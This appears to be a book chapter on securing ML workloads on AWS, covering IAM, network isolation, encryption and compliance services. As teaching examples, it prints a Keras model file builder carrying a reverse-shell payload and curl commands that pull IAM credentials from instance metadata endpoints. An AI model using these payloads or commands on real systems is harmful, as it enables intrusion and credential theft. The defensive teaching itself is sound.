<html><head></head><body>
<div id="sbo-rt-content"><div id="_idContainer286">
<h1 class="chapter-number" id="_idParaDest-175"><a id="_idTextAnchor187"/><a id="_idTextAnchor188"/>9</h1>
<h1 id="_idParaDest-176"><a id="_idTextAnchor189"/>Security, Governance, and Compliance Strategies</h1>
<p>In the first eight chapters of this book, we focused on getting our <strong class="bold">machine learning</strong> (<strong class="bold">ML</strong>) experiments and deployments working in the cloud. In addition to this, we were able to analyze, clean, and transform several sample datasets using a variety of services. For some of the hands-on examples, we made use of synthetically generated datasets that are relatively safe to work with from a security standpoint (since these datasets do not contain <strong class="bold">personally identifiable information</strong> (<strong class="bold">PII</strong>)). We were able to accomplish a lot of things in the previous chapters, but it is important to note that getting the <strong class="bold">data engineering</strong> and <strong class="bold">ML engineering</strong> workloads running in our AWS account is just the first step! Once we need to work on production-level ML requirements, we have to worry about other challenges concerning the <strong class="bold">security</strong>, <strong class="bold">governance</strong>, and <strong class="bold">compliance</strong> of the ML systems and processes. To solve these challenges, we have to use a variety of solutions and techniques that help us prevent, detect, mitigate, and report these issues.</p>
<p>In this chapter, we will cover the following topics:</p>
<ul>
<li>Managing the security and compliance of ML environments</li>
<li>Preserving data privacy and model privacy</li>
<li>Establishing ML governance</li>
</ul>
<p>In contrast to the other chapters in this book, this chapter will not include complete step-by-step solutions as we will talk about a broad range of security topics. These topics will cover the different strategies and techniques regarding how to secure the different services and solutions we discussed in the previous chapters. For each of these topics, we will dive a bit deeper into the relevant subtopics. We will also discuss several security best practices that can easily be implemented on top of existing ML environments running on AWS. With these objectives in mind, let’s begin!</p>
<h1 id="_idParaDest-177"><a id="_idTextAnchor190"/>Managing the security and compliance of ML environments</h1>
<p>Data science teams generally spend a big portion of their time processing the data, training the <a id="_idIndexMarker1048"/>ML model, and deploying the model to an <a id="_idIndexMarker1049"/>inference endpoint. Due to the amount of work and research required to succeed in their primary objectives, these teams often deprioritize any “additional work” concerning security and compliance. After a few months of running production-level ML workloads in the cloud, these teams may end up experiencing a variety of security-related issues due to the following reasons: </p>
<ul>
<li><em class="italic">A lack of understanding and awareness of the importance of security, governance, and compliance</em></li>
<li><em class="italic">Poor awareness of the relevant compliance regulations and policies</em></li>
<li><em class="italic">The absence of solid security processes and standards</em></li>
<li><em class="italic">Poor internal tracking and reporting mechanisms</em> </li>
</ul>
<p>To have a better idea of how to properly manage and handle these issues, we will dive deeper into the following topics in this section:</p>
<ul>
<li>Authentication and authorization</li>
<li>Network security</li>
<li>Encryption at rest and in transit</li>
<li>Managing compliance reports</li>
<li>Vulnerability management</li>
</ul>
<p>We will start <a id="_idIndexMarker1050"/>with the best practices on how to work with the <strong class="bold">AWS Identity and Access Management</strong> (<strong class="bold">IAM</strong>) service when securing the different ML engineering and data engineering services we used in the previous chapters.</p>
<h2 id="_idParaDest-178"><a id="_idTextAnchor191"/>Authentication and authorization</h2>
<p>In <a href="B18638_04.xhtml#_idTextAnchor079"><em class="italic">Chapter 4</em></a>, <em class="italic">Serverless Data Management on AWS</em>, we created an IAM user and attached a few <a id="_idIndexMarker1051"/>existing policies to it. In addition to this, we created and <a id="_idIndexMarker1052"/>attached a custom inline policy that gives the IAM user the necessary permissions to manage <strong class="bold">Redshift Serverless</strong> and <strong class="bold">Lake Formation</strong> resources. If you have worked on the hands-on solutions of said chapter, you have probably wondered, <em class="italic">Why go through all the trouble of setting this up?</em> For one thing, at the time of writing, Redshift Serverless does not support queries being executed using the root account. At the same time, using an IAM user with a limited set of permissions is more secure than using the root account directly. This limits the harm an attacker can do in case the user account gets compromised. </p>
<p class="callout-heading">Note</p>
<p class="callout">In our example, if the IAM (non-root) user account gets compromised, an attacker can only do damage to our <a id="_idIndexMarker1053"/>Redshift Serverless and Lake Formation resources (unless they can perform a <strong class="bold">privilege escalation attack</strong>). We will talk about this topic in detail in a bit!</p>
<p>If the access keys and/or credentials of the root account get stolen, an attacker will have full access to all the resources of all AWS services. On the other hand, if the access keys and/or credentials of an IAM user with a limited set of permissions get stolen, the attacker will only have access to the resources accessible to the IAM user. </p>
<p>Let’s say that we have accidentally pushed the following code to a public repository in GitHub or GitLab:</p>
<pre class="source-code">import boto3
sagemaker_client = boto3.client(
    'sagemaker-runtime',
    aws_access_key_id=<strong class="bold">"&lt;INSERT ACCESS KEY ID&gt;"</strong>,
    aws_secret_access_key=<strong class="bold">"&lt;INSERT SECRET ACCESS KEY&gt;"</strong>
)</pre>
<p>Assuming that the credentials used here are linked to a root account user, an attacker can use these credentials to do “extensive damage,” such as deleting all existing resources in the account or creating new resources that will be used to attack other accounts.</p>
<p class="callout-heading">Note</p>
<p class="callout"><em class="italic">How?</em> One possible move is for the hacker to configure the AWS CLI using the credentials obtained from the source code and history pushed to the public repository, and then run AWS CLI commands that terminate all the running resources in the AWS account. </p>
<p>To prevent <a id="_idIndexMarker1054"/>such a scenario from happening, we can use the <a id="_idIndexMarker1055"/>following block of code instead: </p>
<pre class="source-code">sagemaker_client = boto3.client('sagemaker-runtime')</pre>
<p>Here, we are expecting <strong class="source-inline">boto3</strong> to automatically locate and use the credentials from the environment where the script is running. For example, if the script is running inside an AWS Cloud9 environment, the credentials may be stored inside the <strong class="source-inline">~/.aws</strong> directory.</p>
<p>In addition to this, here <a id="_idIndexMarker1056"/>are some of the best practices and recommended steps to secure our IAM setup:</p>
<ul>
<li>Stop using and delete the access keys for the AWS root account (if possible).</li>
<li>Enable <strong class="bold">multi-factor authentication</strong> (<strong class="bold">MFA</strong>) on the root account and all the IAM <a id="_idIndexMarker1057"/>users.</li>
<li>Rotate the access keys and passwords regularly.</li>
<li>Use (and assume) IAM roles to delegate permissions instead of using long-term passwords or access key credentials whenever possible.</li>
<li>If possible, expire and rotate passwords and keys periodically (for example, every 90 days).</li>
<li>Achieve <a id="_idIndexMarker1058"/>a “least privilege” configuration <a id="_idIndexMarker1059"/>using the <strong class="bold">IAM policy simulator</strong> and <strong class="bold">IAM Access Analyzer.</strong></li>
</ul>
<p>In addition to following the best practices, we should regularly check for any IAM permission misconfigurations. We must spend time digging deeper and verifying what’s exploitable. For one thing, an attacker with access to an IAM user with a limited set of permissions may perform a <strong class="bold">privilege escalation attack</strong> to gain full administrator access to the entire AWS <a id="_idIndexMarker1060"/>account! For example, if the IAM user available <a id="_idIndexMarker1061"/>to the attacker has the <strong class="source-inline">iam:AddUserToGroup</strong> permission, the <a id="_idIndexMarker1062"/>attacker can use the AWS CLI (or any alternative method) to add the IAM user to an existing IAM Group with a less restrictive set of privileges and permissions. If the <strong class="source-inline">AdministratorAccess</strong> managed policy is attached to one of the existing IAM Groups, the attacker can add the compromised IAM user to the Group with the attached <strong class="source-inline">AdministratorAccess</strong> managed policy to gain full administrator access to the entire AWS account. Note that this is just one of the possible scenarios and there are several other known privilege escalation methods. In some cases, attackers may use a chain or combination of these techniques before gaining full administrator access. To prevent these types of attacks, we should avoid granting <strong class="source-inline">iam:*</strong> permissions whenever possible.</p>
<p>At this point, you may be wondering, <em class="italic">How do we test the security of our AWS account</em>? There are several tools, including open source exploitation frameworks and security-testing <a id="_idIndexMarker1063"/>toolkits <a id="_idIndexMarker1064"/>such as <strong class="bold">Pacu</strong>, <strong class="bold">ScoutSuite</strong>, and <strong class="bold">WeirdAAL</strong> (<strong class="bold">AWS Attack Library</strong>) that can be <a id="_idIndexMarker1065"/>used to assess and test the security of cloud environments. We won’t discuss how to use these tools in this book, so feel free to check these out separately.</p>
<p class="callout-heading">Note</p>
<p class="callout">What happens when an attacker gains full administrator access to the AWS account? Well, all sorts of horrible things can happen! For one thing, the attacker can now freely spin up AWS resources such as EC2 instances, which can be used to attack other accounts and systems. Attackers can also use compromised accounts to mine cryptocurrencies (for example, Bitcoin). Attackers should also be able to steal and access the data stored in the databases hosted in the compromised AWS account. It is also possible for all the AWS resources to be deleted. </p>
<p>Before ending this section, let’s discuss how SageMaker execution roles work so that we will have a better idea of how we can improve the security of our ML environment setup. When we use the <strong class="source-inline">get_execution_role</strong> function, we are given the IAM role that was created for SageMaker Studio or the Notebook instance where the code is running:</p>
<pre class="source-code">from sagemaker import get_execution_role
role = <strong class="bold">get_execution_role()</strong></pre>
<p>Depending on how this IAM role is set up, it may have the <strong class="source-inline">AmazonSageMakerFullAccess</strong> IAM policy attached to it, which grants access to several AWS services. If configured with a less restrictive set of permissions, an attacker who can gain access <a id="_idIndexMarker1066"/>to SageMaker Studio or a Notebook instance may <a id="_idIndexMarker1067"/>be able to use a privilege escalation attack to gain additional permissions. Let’s say that you are planning to conduct an ML workshop for 10 participants. To set things up, you started by creating an IAM user for each of the participants to access a dedicated Notebook instance (or the corresponding set of SageMaker Studio domains and users), similar to what is shown in the following diagram:</p>
<div>
<div class="IMG---Figure" id="_idContainer279">
<img alt="Figure 9.1 – Sample IAM configuration of an ML workshop environment " height="722" src="image/B18638_09_001.jpg" width="1177"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 9.1 – Sample IAM configuration of an ML workshop environment</p>
<p>Here, the IAM users only have the permissions to list down and access the Notebook instances available. However, the Notebook instances have IAM roles attached, which may have additional permissions that attackers may take advantage of. That said, once an attacker (as a workshop participant) uses one of the IAM users to access one of the Notebook instances <a id="_idIndexMarker1068"/>available during the workshop, the attacker <a id="_idIndexMarker1069"/>can simply open a <strong class="bold">terminal</strong> inside the Notebook instance and exfiltrate the credentials, which can be used to perform malicious actions. <em class="italic">How?</em> An attacker can simply run the following <strong class="source-inline">curl</strong> command inside the Terminal of the Notebook instance:</p>
<pre class="source-code">curl http://169.254.169.254/latest/meta-data/identity-
credentials/ec2/security-credentials/ec2-instance</pre>
<p>Alternatively, if you have set up and used <strong class="bold">SageMaker Studio</strong> instead for the workshop, the attacker can run the following command and obtain the security credentials:</p>
<pre class="source-code">curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI</pre>
<p>Once the credentials have been exfiltrated, the attacker now has a variety of options regarding how to use these credentials to perform specific attacks. <em class="italic">Scary, right?</em> What if the IAM role attached to the Notebook instances has the <strong class="source-inline">AdministratorAccess</strong> managed policy attached to it? This would mean that the attacker would be able to gain full administrator access using a privilege escalation attack!</p>
<p>To mitigate and manage the risks associated with scenarios similar to this, it is recommended to practice the <strong class="bold">principle of least privilege</strong> when configuring the IAM role attached to the AWS resources. This means that we need to dive deeper into the policies attached to the IAM role and check which permissions can be removed or reduced. This would limit the potential damage, even after a privilege escalation attack has been performed. In addition to this, if you were to conduct an ML workshop, you may want to utilize <strong class="bold">SageMaker Studio Lab</strong> instead of creating Notebook instances in your AWS account for <a id="_idIndexMarker1070"/>your participants to use. With this approach, the workshop participants can run ML training experiments and deployments without having to use an AWS account. At the same time, using SageMaker Studio Lab is free and perfect for workshops!</p>
<p class="callout-heading">Note</p>
<p class="callout">For more information <a id="_idIndexMarker1071"/>on this topic, check out <a href="https://studiolab.sagemaker.aws/">https://studiolab.sagemaker.aws/</a>.</p>
<h2 id="_idParaDest-179"><a id="_idTextAnchor192"/>Network security</h2>
<p>When training and deploying ML models, it is possible for ML engineers to accidentally use a library or a custom container image that includes malicious code prepared by an attacker. For example, an attacker may generate a <strong class="bold">reverse shell payload</strong> – a payload that, when <a id="_idIndexMarker1072"/>executed, would connect the target server to the attacker’s machine. Once the <a id="_idIndexMarker1073"/>connection is made, a Terminal shell allows the attacker to run commands inside the target server. <em class="italic">Scary, right?</em> This payload would then be injected inside a file that, when loaded (by the ML library or framework), would run the payload as well. Here’s a sample block of code that generates a <strong class="source-inline">model.h5</strong> file that contains a reverse shell payload:</p>
<pre class="source-code">import tensorflow
from tensorflow.keras.layers import Input, Lambda, Softmax
from tensorflow.keras.models import Model
from tensorflow.keras.optimizers import Adam
def <strong class="bold">custom_layer</strong>(tensor):
    <strong class="bold">PAYLOAD</strong> = 'rm /tmp/FCMHH; mkfifo /tmp/FCMHH; cat /tmp/FCMHH | /bin/sh -i 2&gt;&amp;1 | nc 127.0.0.1 14344 &gt; /tmp/FCMHH'
    <strong class="bold">__import__('os').system(PAYLOAD)</strong>
    
    return tensor
input_layer = Input(shape=(10), name="input_layer")
lambda_layer = Lambda(
    <strong class="bold">custom_layer</strong>,   
    name="lambda_layer"
)(input_layer)
output_layer = Softmax(name="output_layer")(lambda_layer)
model = Model(input_layer, output_layer, name="model")
model.compile(optimizer=Adam(lr=0.0004), loss="categorical_crossentropy")
<strong class="bold">model.save("model.h5")</strong></pre>
<p>Here, the attacker takes <a id="_idIndexMarker1074"/>advantage of the <strong class="bold">Keras Lambda layer</strong> to run custom functions. Loading <a id="_idIndexMarker1075"/>the generated file is similar to how other models are loaded using TensorFlow:</p>
<pre class="source-code">from tensorflow.keras.models import load_model
load_model("model.h5")</pre>
<p>There are different <a id="_idIndexMarker1076"/>variations of this, including injecting a payload to pickle files and YAML files, which affects other <a id="_idIndexMarker1077"/>libraries and frameworks such as <em class="italic">scikit-learn</em> and <em class="italic">PyTorch</em>.</p>
<p class="callout-heading">Note</p>
<p class="callout">For more examples of how to inject malicious payloads inside ML model files, check out <a href="https://gist.github.com/joshualat/a3fdfa4d49d1d6725b1970133d06866b">https://gist.github.com/joshualat/a3fdfa4d49d1d6725b1970133d06866b</a>.</p>
<p>Once the reverse shell payload executes inside the training and inference containers within the ML instances, the attacker may be able to access the data and transfer it to an external server. To prevent these types of attacks, we can enable <strong class="bold">network isolation</strong> when running <a id="_idIndexMarker1078"/>training jobs in SageMaker. This configuration removes the ability to run containers inside the ML instances to make outbound network calls. In <a href="B18638_06.xhtml#_idTextAnchor132"><em class="italic">Chapter 6</em></a>, <em class="italic">SageMaker Training and Debugging Solutions</em>, we enabled network isolation when initializing the <strong class="source-inline">Estimator</strong> object, similar to what’s shown in the following block of code:</p>
<pre class="source-code">estimator = Estimator(
    image,
    role,
    instance_type='ml.p2.xlarge',
    ...
    <strong class="bold">enable_network_isolation=True</strong>
)</pre>
<p>Once we run the training job using the <strong class="source-inline">fit()</strong> method in a later step, the training containers inside the ML <a id="_idIndexMarker1079"/>instances will no longer have network access while the training jobs are running.</p>
<p class="callout-heading">Note</p>
<p class="callout">Of course, our first layer of defense is to avoid using models and code from untrusted and potentially dangerous sources. However, despite our best intentions, we may still end up accidentally downloading compromised resources. This is the reason why we need to utilize network isolation solutions as the next layer of defense.</p>
<p>We can have a similar secure setup by preparing and using a <strong class="bold">VPC</strong> without the following:</p>
<ul>
<li>An <strong class="bold">internet gateway</strong>, which enables <a id="_idIndexMarker1080"/>resources in the public subnets to have internet access</li>
<li>A <strong class="bold">NAT gateway</strong>, which <a id="_idIndexMarker1081"/>allows resources in the private subnets to establish “one-way” outbound connections</li>
<li>Other similar gateways that may allow resources from inside and outside the VPC to communicate with each other</li>
</ul>
<p>With this setup, resources deployed inside the VPC will not have internet connectivity. That said, if we run a training script containing malicious code inside an EC2 instance deployed inside the VPC, the malicious code will not be able to access the internet and connect to servers and resources outside of the VPC. <em class="italic">What if we want to upload and download files from an S3 bucket?</em> To get this working, we will need to configure <strong class="bold">VPC endpoints</strong> to enable network connectivity to AWS services such as S3. If we want to connect to resources <a id="_idIndexMarker1082"/>inside another VPC, we can use <strong class="bold">AWS PrivateLink</strong> and access these <a id="_idIndexMarker1083"/>resources using their private IP addresses. With this approach, resources are not accessed over the internet and no internet gateways need to be present when using AWS PrivateLink (an interface VPC endpoint).</p>
<p>The following can be <a id="_idIndexMarker1084"/>set up so that AWS resources can be accessed directly and more securely via PrivateLink:</p>
<ul>
<li>Accessing <strong class="bold">Amazon Athena</strong> via <a id="_idIndexMarker1085"/>PrivateLink</li>
<li>Accessing <strong class="bold">AWS Lambda</strong> via <a id="_idIndexMarker1086"/>PrivateLink</li>
<li>Connecting <a id="_idIndexMarker1087"/>to <strong class="bold">Amazon Redshift</strong> via PrivateLink</li>
<li>Invoking <strong class="bold">SageMaker Inference Endpoints</strong> via <a id="_idIndexMarker1088"/>PrivateLink</li>
<li>Connecting <a id="_idIndexMarker1089"/>to <strong class="bold">SageMaker Studio</strong> via PrivateLink</li>
<li>Accessing <strong class="bold">API Gateway</strong> APIs <a id="_idIndexMarker1090"/>via PrivateLink</li>
</ul>
<p>Note that this is <a id="_idIndexMarker1091"/>not an exhaustive list of what can be secured using PrivateLink, as there’s a long list of services that integrate with PrivateLink. </p>
<p class="callout-heading">Note</p>
<p class="callout">For more information on the supported list of services, check out <a href="https://docs.aws.amazon.com/vpc/latest/privatelink/aws-services-privatelink-support.xhtml">https://docs.aws.amazon.com/vpc/latest/privatelink/aws-services-privatelink-support.xhtml</a>.</p>
<h2 id="_idParaDest-180"><a id="_idTextAnchor193"/>Encryption at rest and in transit</h2>
<p>SageMaker <a id="_idIndexMarker1092"/>supports a variety of options for the data source when <a id="_idIndexMarker1093"/>training ML models. In most <a id="_idIndexMarker1094"/>cases, ML engineers default to using an <strong class="bold">Amazon S3</strong> bucket as <a id="_idIndexMarker1095"/>the default source of data. In other cases, <strong class="bold">Amazon Elastic File System</strong> (<strong class="bold">Amazon EFS</strong>) would be used instead, especially for workloads that require higher throughput. For even higher performance <a id="_idIndexMarker1096"/>throughput requirements, we can use <strong class="bold">Amazon FSx for Lustre</strong> (which may be linked to an S3 bucket for the source). These storage <a id="_idIndexMarker1097"/>options integrate with <strong class="bold">AWS Key Management Service</strong> (<strong class="bold">AWS KMS</strong>), which helps ensure that data is automatically encrypted (that is, unreadable without a secret key) before being written to the filesystem. Once data needs to be loaded and read, it is decrypted automatically. </p>
<p class="callout-heading">Note</p>
<p class="callout">For more <a id="_idIndexMarker1098"/>information <a id="_idIndexMarker1099"/>about cryptography <a id="_idIndexMarker1100"/>concepts such as <strong class="bold">asymmetric and symmetric encryption</strong>, <strong class="bold">decryption</strong>, and <strong class="bold">envelope encryption</strong>, feel <a id="_idIndexMarker1101"/>free to check out <a href="https://docs.aws.amazon.com/crypto/latest/userguide/cryptography-concepts.xhtml">https://docs.aws.amazon.com/crypto/latest/userguide/cryptography-concepts.xhtml</a>.</p>
<p>Note that we have two <a id="_idIndexMarker1102"/>options when using KMS. The first one involves using the default <strong class="bold">AWS-managed key</strong> and the second one involves creating and using a <strong class="bold">customer-managed key</strong>. <em class="italic">When should we use a customer-managed key?</em> If we want more control, such as <a id="_idIndexMarker1103"/>enabling key rotation along <a id="_idIndexMarker1104"/>with the option to revoke, disable, or delete key <a id="_idIndexMarker1105"/>access, then we should opt to use a customer-managed key. If you are wondering if the storage volumes attached to the training and hosting instances can be encrypted with a KMS customer-managed key, then the answer to that would be a <em class="italic">YES</em> as well. To use a customer-managed key, we simply specify an optional KMS key ID, similar to what we have in the following block of code:</p>
<pre class="source-code">estimator = Estimator(
    image,
    ...
    volume_kms_key=<strong class="bold">&lt;insert kms key ARN&gt;</strong>,
    output_kms_key=<strong class="bold">&lt;insert kms key ARN&gt;</strong>
)
...
estimator.deploy(
    ...
    kms_key=<strong class="bold">&lt;insert kms key ARN&gt;</strong>
)</pre>
<p>Here, we can see that we can also specify an optional KMS key that will be used to encrypt the output files in Amazon S3. In addition to encrypting the data at rest, we will need to ensure secure data transmission when performing distributed training. When multiple instances are used when performing training jobs, we can enable <strong class="bold">inter-container traffic encryption</strong> to secure the data that’s transmitted between the instances. If there are <a id="_idIndexMarker1106"/>specific regulatory requirements we need to comply with, we will need to ensure that the data that’s transmitted is encrypted as well.</p>
<p>Enabling inter-container traffic encryption is straightforward when using the <strong class="bold">SageMaker Python SDK</strong>:</p>
<pre class="source-code">estimator = Estimator(
    image,
    ...
    <strong class="bold">encrypt_inter_container_traffic=True</strong>
)</pre>
<p><em class="italic">Wasn’t that easy?</em> Before enabling inter-container traffic encryption, make sure that you’re aware of its potential impact on the overall training time and cost of the training job. When using <a id="_idIndexMarker1107"/>distributed deep learning <a id="_idIndexMarker1108"/>algorithms, the overall training time and cost may increase after adding this additional level of security. For <strong class="bold">SageMaker Processing</strong> jobs, which can be used for automated data processing for a variety of use cases, we can enable this by specifying a <strong class="source-inline">NetworkConfig</strong> object, similar to what we have in the following block of code:</p>
<pre class="source-code">config = NetworkConfig(
    enable_network_isolation=True,
    <strong class="bold">encrypt_inter_container_traffic=True</strong>
)
processor = ScriptProcessor(
    ...
    <strong class="bold">network_config=config</strong>
)
processor.run(
    ...
)</pre>
<p>Note that this approach should work across the different “types” of processing jobs, as follows: </p>
<ul>
<li><strong class="source-inline">SageMakerClarifyProcessor</strong> for model explainability needs and automated bias metrics computation</li>
<li><strong class="source-inline">PySparkProcessor</strong> for processing jobs using <strong class="bold">PySpark</strong></li>
<li><strong class="source-inline">SKLearnProcessor</strong> for processing jobs using <strong class="bold">scikit-learn</strong></li>
</ul>
<p>SageMaker also supports the usage of custom container images when processing data and when training and deploying models. These container images, which are stored inside <strong class="bold">Amazon Elastic Container Registry</strong> (<strong class="bold">Amazon ECR</strong>), can be encrypted at rest using <a id="_idIndexMarker1109"/>a KMS customer-managed key <a id="_idIndexMarker1110"/>as well. <em class="italic">How does this work?</em> When <a id="_idIndexMarker1111"/>container images are pushed (for example, using the <strong class="source-inline">docker push</strong> command), ECR automatically encrypts these images. Once these container images are pulled (for example, using the <strong class="source-inline">docker pull</strong> command), ECR automatically decrypts these images.</p>
<p>In addition to these, we can encrypt the following in SageMaker with KMS:</p>
<ul>
<li>SageMaker Studio storage volumes</li>
<li>The output files of the SageMaker Processing job</li>
<li>Output data of the SageMaker Ground Truth labeling job</li>
<li>SageMaker Feature Store online and offline stores</li>
</ul>
<p class="callout-heading">Note</p>
<p class="callout">It’s probably our first time mentioning <strong class="bold">SageMaker Ground Truth</strong> and <strong class="bold">SageMaker Feature Store</strong> in this book! If you’re wondering what these are, SageMaker Ground Truth is a data labeling <a id="_idIndexMarker1112"/>service that helps ML practitioners prepare high-quality labeled datasets using a variety of options, while SageMaker Feature Store is a fully-managed feature store where features for ML models can be stored, shared, and <a id="_idIndexMarker1113"/>managed. We won’t dive deep into the details <a id="_idIndexMarker1114"/>on how these work in this book, so feel free to check out <a href="https://docs.aws.amazon.com/sagemaker/latest/dg/data-label.xhtml">https://docs.aws.amazon.com/sagemaker/latest/dg/data-label.xhtml</a> and https://docs.aws.amazon.com/sagemaker/latest/dg/feature-store.xhtml for more details on these topics.</p>
<p><em class="italic">What if we are performing data processing, model training, and model deployments outside of SageMaker?</em> The good news is that many services in the AWS platform <a id="_idIndexMarker1115"/>are integrated with KMS. This means that it’s <a id="_idIndexMarker1116"/>usually just a minor configuration change to enable server-side encryption. Here are some examples of what is immediately available with KMS:</p>
<ul>
<li>EBS volume encryption</li>
<li>Redshift cluster encryption</li>
<li>Encryption of Amazon S3 objects</li>
<li>Encryption of data written by Glue DataBrew jobs</li>
<li>Encryption of log data stored in CloudWatch Logs</li>
</ul>
<p>We can also use the <strong class="bold">AWS Encryption SDK</strong> to encrypt the data before sending the data to an AWS <a id="_idIndexMarker1117"/>service (for example, Amazon S3). Using the same client-side encryption library, we can decrypt the data after retrieving it from the storage location.</p>
<p class="callout-heading">Note</p>
<p class="callout">There are several <a id="_idIndexMarker1118"/>options to choose from when dealing with encryption <a id="_idIndexMarker1119"/>and decryption requirements on AWS. In addition <a id="_idIndexMarker1120"/>to <strong class="bold">AWS KMS</strong> and the <strong class="bold">AWS Encryption SDK</strong>, there’s <a id="_idIndexMarker1121"/>also the <strong class="bold">DynamoDB Encryption Client</strong> and <strong class="bold">AWS CloudHSM</strong>. We won’t dive deep into each of these, so feel to check out https://docs.aws.amazon.com/crypto/latest/userguide/awscryp-choose-toplevel.xhtml for more information.</p>
<p>In addition to what has been discussed already, we must know a few additional techniques on how to protect and encrypt the data in transit when using EC2 instances for ML requirements. In <a href="B18638_02.xhtml#_idTextAnchor041"><em class="italic">Chapter 2</em></a>, <em class="italic">Deep Learning AMIs</em>, we launched the <strong class="bold">Jupyter Notebook</strong> application <a id="_idIndexMarker1122"/>from the command line inside an <a id="_idIndexMarker1123"/>EC2 instance. You probably noticed that we accessed the application using HTTP instead of HTTPS. One of the improvements we can do is to use SSL (using a web certificate) to encrypt the traffic between the server and the browser. Another solution would be to access the Jupyter Notebook application using <strong class="bold">SSH tunneling</strong>. <em class="italic">SSH what?</em> SSH tunneling is a mechanism that involves <a id="_idIndexMarker1124"/>using an encrypted SSH connection between two computers to forward connections via a secure channel:</p>
<div>
<div class="IMG---Figure" id="_idContainer280">
<img alt="Figure 9.2 – SSH tunneling " height="539" src="image/B18638_09_002.jpg" width="1124"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 9.2 – SSH tunneling</p>
<p>Here, we can see that we can access the Jupyter Notebook app from the local machine, even if the application is running inside the EC2 instance. Here, we make use of SSH tunneling to forward the connection over the secure channel with SSH.</p>
<p>To set this up, we simply need to run a command similar to what we have in the following command block (assuming that our local machine is a Unix operating system):</p>
<pre class="source-code">ssh &lt;user&gt;@&lt;IP address of instance&gt; -NL 14344:localhost:8888</pre>
<p>After the command runs, we <a id="_idIndexMarker1125"/>should be able to access the <a id="_idIndexMarker1126"/>Jupyter Notebook application locally by visiting the following link in a browser: <a href="http://localhost:14344">http://localhost:14344</a>.</p>
<p>Now that we’ve discussed several techniques to encrypt the data, let’s proceed with discussing some of the services we can use to help us manage the compliance of our environments.</p>
<h2 id="_idParaDest-181"><a id="_idTextAnchor194"/>Managing compliance reports</h2>
<p>In addition to securing ML environments and systems, it is critical for data science teams to manage the <a id="_idIndexMarker1127"/>overall compliance of the processes and configuration of the resources used in the AWS account. Managing compliance involves identifying the relevant regulations and guidelines an <a id="_idIndexMarker1128"/>organization needs <a id="_idIndexMarker1129"/>to comply with (for example, <strong class="bold">HIPAA</strong>, <strong class="bold">PCI-DSS</strong>, and <strong class="bold">GDPR</strong>) and <a id="_idIndexMarker1130"/>performing the recommended set of steps to achieve (and maintain) the required compliance.</p>
<p>Security and compliance are shared between AWS and the customers. Customers generally need to focus on the following aspects:</p>
<ul>
<li>The guest operating system</li>
<li>Any applications running on top of the AWS services</li>
<li>The configuration of the different AWS resources used</li>
</ul>
<p class="callout-heading">Note</p>
<p class="callout">For more details <a id="_idIndexMarker1131"/>on the <strong class="bold">Shared Responsibility Model</strong>, check out <a href="https://aws.amazon.com/compliance/shared-responsibility-model/">https://aws.amazon.com/compliance/shared-responsibility-model/</a>.</p>
<p>There are a variety of services, tools, and capabilities available in AWS when dealing with compliance enforcement and reporting:</p>
<ul>
<li><strong class="bold">AWS Artifact</strong>: This is <a id="_idIndexMarker1132"/>a central source of security and compliance documents, reports, and resources. Here, we can download the relevant security and compliance documents we will need.</li>
<li><strong class="bold">AWS Config</strong>: This can <a id="_idIndexMarker1133"/>be used to continuously monitor the configuration of the AWS resources and enable automated remediation to ensure the compliance of ML environments and systems.</li>
<li><strong class="bold">AWS Audit Manager</strong>: This <a id="_idIndexMarker1134"/>helps simplify the risk and compliance assessment of AWS resources.</li>
<li><strong class="bold">AWS Compliance Center</strong>: This is <a id="_idIndexMarker1135"/>a central source of cloud-related regulatory resources.</li>
</ul>
<p>We won’t dive deep into the <a id="_idIndexMarker1136"/>details of how these services are used, so feel free to check out the <em class="italic">Further reading</em> section at the end of this chapter for more details. In the next section, we will quickly discuss some of the relevant services that can help us with vulnerability management. </p>
<h2 id="_idParaDest-182"><a id="_idTextAnchor195"/>Vulnerability management</h2>
<p>Implementing the security best practices will not guarantee that an environment or a system is safe from <a id="_idIndexMarker1137"/>attacks. In addition to following the security best practices and compliance requirements, teams should use a variety of vulnerability assessment and management tools to check for potentially exploitable vulnerabilities in the system.</p>
<p>One of the practical solutions to <a id="_idIndexMarker1138"/>use when detecting and managing vulnerabilities in AWS is <strong class="bold">Amazon Inspector</strong>. Amazon Inspector enables <strong class="bold">automated vulnerability management</strong> through its automatic detection of vulnerabilities <a id="_idIndexMarker1139"/>in EC2 instances and container images pushed to Amazon ECR. <em class="italic">How does this work?</em> Every time a “change” is detected (for example, a container image push to ECR), Amazon Inspector scans the resources automatically so that no manual vulnerability scan needs to be initiated by the user. This means that if we are preparing and building a custom container image for a <strong class="bold">SageMaker Processing</strong> job, training job, or an ML inference endpoint, Amazon Inspector will automatically scan the container image for us every time we push a new version to the Amazon ECR repository. If vulnerabilities are detected and reported by Amazon Inspector, the next step is for us to perform the needed remediation steps on the affected resources.</p>
<p class="callout-heading">Note</p>
<p class="callout">For a step-by-step <a id="_idIndexMarker1140"/>tutorial on how to use and set up Amazon Inspector, check out <a href="https://medium.com/@arvs.lat/automated-vulnerability-management-on-aws-with-amazon-inspector-53c572bf8515">https://medium.com/@arvs.lat/automated-vulnerability-management-on-aws-with-amazon-inspector-53c572bf8515</a>.</p>
<p>In addition to Amazon Inspector, we can use the following services and capabilities to manage security risks and vulnerabilities in our ML environments on AWS:</p>
<ul>
<li><strong class="bold">Amazon CodeGuru Reviewer</strong>: This <a id="_idIndexMarker1141"/>can be used to analyze <a id="_idIndexMarker1142"/>code and detect security issues automatically using <strong class="bold">security detectors.</strong></li>
<li><strong class="bold">Amazon GuardDuty</strong>: This can be used to automatically detect malicious activities such <a id="_idIndexMarker1143"/>as privilege escalation attacks in an AWS account..</li>
<li><strong class="bold">AWS Security Hub</strong>: This <a id="_idIndexMarker1144"/>can be used to automate security checks and conduct cloud security posture management.</li>
</ul>
